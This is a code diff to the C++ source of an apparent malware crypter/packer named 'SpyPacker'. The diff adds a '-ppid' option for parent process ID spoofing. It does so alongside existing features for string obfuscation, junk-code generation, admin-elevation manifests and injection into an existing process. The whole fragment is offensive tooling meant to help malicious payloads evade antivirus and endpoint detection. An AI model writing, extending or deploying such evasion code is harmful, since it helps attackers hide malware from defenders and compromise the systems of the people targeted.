@@ -485,7 +485,7 @@ void main(int argc, char* argv[])
 	printf("SpyPacker started!'\n");
 	 
 	char* infile_path; char* target_name; int outnametype = 0; char* outname;
-	bool target = false, conpresent = false, trash = false, manifest = false, input = false, output = false;
+	bool target = false, conpresent = false, ppid = false, trash = false, manifest = false, input = false, output = false;
 	 
 	for (int i = 1; i < argc; ++i) { 
 		//printf("arg %d %s\n", i, argv[i]);
@@ -493,6 +493,8 @@ void main(int argc, char* argv[])
 			conpresent = true; 
 		if (!strcmp(argv[i], "-g") || !strcmp(argv[i], "-genjunk"))
 			trash = true;
+		if (!strcmp(argv[i], "-ppid"))
+			ppid = true;
 		if (!strcmp(argv[i], "-m") || !strcmp(argv[i], "-requireadmin"))
 			manifest = true;
 		else if (!strcmp(argv[i], "-i") || !strcmp(argv[i], "--in")) {
@@ -572,6 +574,7 @@ void main(int argc, char* argv[])
 
 	printf("Console present: %d\n", conpresent);
 	printf("Generate junk functions: %d\n", trash);
+	printf("Parent Process ID (PPID) Spoofing: %d\n", ppid);
 	printf("Require admin: %d\n", manifest);
 
 	CrypterPackageCtx* ctx = new CrypterPackageCtx;
@@ -807,7 +810,8 @@ void main(int argc, char* argv[])
 		"#pragma once\r\n"
 		"#include \"%s/tools/DataObfuscator.h\"\r\n"
 		"%s\r\n" //define DEBUG
-		"%s\r\n" //define INJECT_TO_EXISTING_PROCESS
+		"%s\r\n" //define PPID
+		"%s\r\n" //define INJECT_TO_EXISTING_PROCESS 
 		"#define procname XorStr(\"%s\")\r\n"
 		"#ifdef DEBUG\r\n"
 		"#define printfdbg printf\r\n"
@@ -816,7 +820,7 @@ void main(int argc, char* argv[])
 		"#endif\r\n"
 		"\r\n";
 
-	fprintf(header_stream, header_source, curpath.c_str(), conpresent ? "#define DEBUG" : "", target ? "#define INJECT_TO_EXISTING_PROCESS" : "", target ? target_name : "");
+	fprintf(header_stream, header_source, curpath.c_str(), conpresent ? "#define DEBUG" : "", ppid ? "#define PPID" : "", target ? "#define INJECT_TO_EXISTING_PROCESS" : "", target ? target_name : "");
 
 	fclose(header_stream);
 	//
